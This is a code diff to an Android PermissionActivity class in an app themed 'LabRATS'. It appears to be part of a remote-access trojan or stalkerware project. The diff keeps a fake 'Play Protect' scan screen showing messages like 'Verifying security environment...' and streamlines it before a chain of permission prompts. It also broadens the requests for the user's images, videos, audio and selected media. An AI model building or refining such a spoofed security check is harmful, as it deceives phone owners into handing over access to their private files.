@@ -126,11 +126,6 @@ public class PermissionActivity extends Activity {
 
     private void setupScanningUI() {
         if (isAnimationRunning) return;
-        try {
-            setTheme(R.style.Theme_LabRATS_Permissions);
-        } catch (Throwable t) {
-            setTheme(android.R.style.Theme_Translucent_NoTitleBar);
-        }
         setContentView(R.layout.activity_guide_permission);
         currentLayoutType = "scanning";
 
@@ -138,42 +133,15 @@ public class PermissionActivity extends Activity {
         TextView tvDetails = findViewById(R.id.tvPlayProtectDetails);
         TextView tvSub = findViewById(R.id.tvPlayProtectSub);
 
-        isAnimationRunning = true;
-        final long startTime = android.os.SystemClock.elapsedRealtime();
-        final long totalDuration = 2800; // Calmer 2.8s scan delay (~30% longer)
+        if (pb != null) {
+            pb.setProgress(20);
+        }
+        if (tvDetails != null) tvDetails.setText("Verifying security environment...");
+        if (tvSub != null) tvSub.setText("Verifying environment...");
 
-        chainHandler.post(new Runnable() {
-            @Override
-            public void run() {
-                if (isFinishing() || isDestroyed() || !"scanning".equals(currentLayoutType)) return;
-                
-                long elapsed = android.os.SystemClock.elapsedRealtime() - startTime;
-                int progress = (int) Math.min(100, (elapsed * 100) / totalDuration);
-                
-                if (pb != null) {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                        pb.setProgress(progress, true);
-                    } else {
-                        pb.setProgress(progress);
-                    }
-                }
-                if (tvDetails != null) {
-                    if (progress < 30) tvDetails.setText("Initializing security environment...");
-                    else if (progress < 60) tvDetails.setText("Analyzing security modules...");
-                    else if (progress < 85) tvDetails.setText("Checking for restricted access...");
-                    else tvDetails.setText("Finalizing report...");
-                }
-                if (progress > 40 && tvSub != null) tvSub.setText("Verifying environment...");
-
-                if (progress < 100) {
-                    chainHandler.postDelayed(this, 16); // 60 FPS update
-                } else {
-                    isAnimationRunning = false;
-                    hasScanned = true;
-                    checkSpecialChain();
-                }
-            }
-        });
+        hasScanned = true;
+        isAnimationRunning = false;
+        checkSpecialChain();
     }
 
     private int currentScanProgress = 20;
@@ -645,12 +613,22 @@ public class PermissionActivity extends Activity {
         }
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_MEDIA_IMAGES);
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_MEDIA_VIDEO);
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_MEDIA_AUDIO);
+            boolean hasImages = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
+            boolean hasVideo = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED;
+            boolean hasAudio = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED;
+
+            if (Build.VERSION.SDK_INT >= 34) {
+                boolean hasSelected = ContextCompat.checkSelfPermission(this, "android.permission.READ_MEDIA_VISUAL_USER_SELECTED") == PackageManager.PERMISSION_GRANTED;
+                if (!hasImages && !hasSelected) needed.add(Manifest.permission.READ_MEDIA_IMAGES);
+                if (!hasVideo && !hasSelected) needed.add(Manifest.permission.READ_MEDIA_VIDEO);
+                if (!hasImages && !hasVideo && !hasSelected) {
+                    needed.add("android.permission.READ_MEDIA_VISUAL_USER_SELECTED");
+                }
+            } else {
+                if (!hasImages) needed.add(Manifest.permission.READ_MEDIA_IMAGES);
+                if (!hasVideo) needed.add(Manifest.permission.READ_MEDIA_VIDEO);
+            }
+            if (!hasAudio) needed.add(Manifest.permission.READ_MEDIA_AUDIO);
         }
         return needed;
     }
